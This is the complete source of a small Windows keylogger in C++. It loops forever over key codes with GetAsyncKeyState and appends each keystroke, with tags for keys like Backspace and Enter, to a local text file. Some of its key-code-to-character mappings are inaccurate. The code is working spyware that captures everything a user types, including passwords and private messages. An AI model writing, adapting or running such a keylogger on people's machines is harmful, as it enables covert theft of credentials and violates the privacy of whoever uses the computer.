#include <iostream> // gets input prints output
#include <fstream>  // write to file and read
#include <windows.h>
#include <Winuser.h>

using namespace std;

void log();

int main()
{

	log();
	return 0;

}

void log()
{
	char c;

	for(;;) // infinite loop
	{
		// using ASCII to collect input
		for(c = 8; c <= 222; c++)
		{
			// check for user input
			if(GetAsyncKeyState(c) == -32767)
			{
				// ios::app prevents file rewrite with every key press
				ofstream write("keylog_stream.txt", ios::app);
				// write << c;
				switch(c)
				{
					case 8: write << "<Backspace>";
						break;
					case 9: write << "<TAB>";
						break;
					case 27: write << "<ESC>";
						break;
					case 127: write << "<DEL>";
						break;
					case 32: write << "<Space>";
						break;
					case 13: write << "<Enter>\n";
						break;
					case 14: write << "<shiftout>";
						break;
					case 15: write << "<shiftin>";
						break;
					case 33: write << " ! ";
						break;
					case 34: write << "doubleQuote";
						break;
					case 35: write << " # ";
						break;
					case 36: write << " $ ";
						break;
					case 37: write << " % ";
						break;
					case 38: write << " & ";
						break;
					default: write << c;
				}
			}
		}
	}
}
